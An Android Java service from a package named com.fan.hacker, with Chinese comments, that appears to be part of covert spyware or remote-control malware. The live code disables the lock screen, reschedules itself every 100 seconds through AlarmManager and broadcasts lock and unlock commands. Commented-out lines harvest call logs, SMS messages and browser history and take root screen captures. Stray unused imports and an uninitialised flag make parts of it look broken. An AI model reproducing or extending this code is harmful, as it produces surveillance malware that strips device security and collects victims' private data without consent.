package com.fan.hacker;


import java.util.ArrayList;

import org.omg.CORBA.PUBLIC_MEMBER;

import com.sun.xml.internal.bind.v2.schemagen.xmlschema.List;

import android.app.KeyguardManager;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.media.AudioManager;
import android.media.SoundPool;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;
import android.widget.Toast;
/*
 * 此类与AlarmReciever相结合实现某个时间间隔后执行一次onStartCommand,然后在此函数中调用SendThread执行一次（接着调run）
 * */
public class SendService extends Service {
	private static final String TAG ="SendService";
	public static final String ACTION = "com.fan.hacker.SendService";
	private Thread mSendThread =null;
	private int secondsIntervalOfService =100;//间隔的秒数
	private Handler mHandler= new Handler();
	Boolean flag;
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		
		
		super.onCreate();
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		((KeyguardManager)getSystemService(Activity.KEYGUARD_SERVICE)).newKeyguardLock("IN").disableKeyguard();
		
		
		Log.d("SendService", "com.fan.hacker.SendService:onStartCommand");
		mSendThread = new SendThread();
		mSendThread.start();//每次服务启动时，调用发送线程执行一次发送
		AlarmManager alarmManager = (AlarmManager)getSystemService(ALARM_SERVICE);
		int intervalTime =secondsIntervalOfService*1000;//设定为secondsIntervalOfService秒，服务执行一次
		long triggerAtTime =SystemClock.elapsedRealtime() +intervalTime;
		Intent intent2 =new Intent(this, AlarmReciever.class);
		PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent2, 0);
		alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pendingIntent);
		return super.onStartCommand(intent, flags, startId);
	}
	public void backgroudprocessing() {
		mHandler.post(doUpdateUI);
		System.out.println("backgroudprocessing!");
	}
	private Runnable doUpdateUI =new Runnable() { //此函数在主线程中执行的
//		ArrayList listRecord; 
		//String smsString;
		String browseString;
		@Override
		public void run() {
			//已经能成功调用电话记录
//			CallRecord callRecord = new CallRecord(getApplicationContext());
//        	listRecord =(ArrayList<CallRecord.RecordEntity>)callRecord.callRecQuery();
//        	System.out.println("doUpdateUI listRecord END!");
//			Toast.makeText(getApplicationContext(), listRecord.toString(), Toast.LENGTH_LONG).show();
//			System.out.println("doUpdateUI toast END!");
			//调用信息记录
			//SmsRecord smsRecord =new SmsRecord(getApplicationContext());
			//smsString =smsRecord.getSmsRecords();
			//Log.d(TAG, smsString);
			//Toast.makeText(getApplicationContext(), smsString, Toast.LENGTH_LONG).show();
			//调用浏览器记录
//			BrowserRecord browserRecord = new BrowserRecord(getApplicationContext());
//			browserRecord.test();
//			Log.d(TAG, browseString);
//			Toast.makeText(getApplicationContext(), browseString, Toast.LENGTH_LONG).show();
		}
	};
	class SendThread extends Thread
	{
		
		@Override
		public void run() {
			
	            {
	            	
	            	flag =!flag;
	            	if (flag) {
		            	Intent intent =new Intent("com.fan.hacker.lockscreen");
		            	sendBroadcast(intent);
		            	System.out.println("send lock screen Broadcast!");
					}
	            	else {
		            	Intent intent =new Intent("com.fan.hacker.unlockscreen");
		            	sendBroadcast(intent);
		            	System.out.println("send un lock screen Broadcast!");
					}
	            	//backgroudprocessing();

	            	//String pathString =ScreenCapture.screenCap();//只要有root权限，将会在间隔时间内抓一个屏幕，保存到/storage/emlated/0文件夹下
	            	//Toast.makeText(getApplicationContext(), "发送服务执行", Toast.LENGTH_LONG).show();
//	            	SoundPool soundPool = new SoundPool(1, AudioManager.STREAM_MUSIC, 0);
//	            	int soundID =soundPool.load(getApplicationContext(), R.raw.gpscome, 1);
//	            	soundPool.play(soundID, 1, 1, 1, 0, 1);
	            	
	            	
	            	
	            }
			super.run();
		}
		
	}
}
